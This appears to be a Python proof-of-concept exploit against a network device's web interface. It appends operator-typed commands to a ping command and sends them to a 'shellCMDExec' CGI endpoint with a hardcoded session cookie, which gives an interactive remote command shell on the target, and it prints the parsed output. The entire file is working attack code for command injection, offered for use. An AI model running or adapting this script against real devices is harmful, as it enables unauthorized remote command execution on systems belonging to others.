import requests

while True:
	command="ping 8.8.8.8 -c 4\n"
	usercommand=input("Your Command: ")
	command+=usercommand
	url = 'http://192.168.1.65/cgi/home.php'
	params = {
	'fun': 'system',
	'page': 'shellCMDExec',
	'isajax': '1',
	'runtab': '1',
	'cmdExec': '1',
	'command': command,
	'random': '1725991418844'
	}

	cookies = {
	'Cookie_Language': 'en',
	'Cookie_Sid': '1',
	'Cookie_Login': 'd9899185dc135e97a66ba5be6ab76bd4'
	}

	response = requests.get(url, params=params, cookies=cookies)
	output=response.text
	end_index = output.find("</textarea>")
	if end_index != -1:
		output = output[:end_index]
	lines = output.splitlines()
	for i, line in enumerate(lines):
		if "round-trip" in line:
			lines = lines[i+1:]
			break
	output="\n".join(lines)
	print(output)
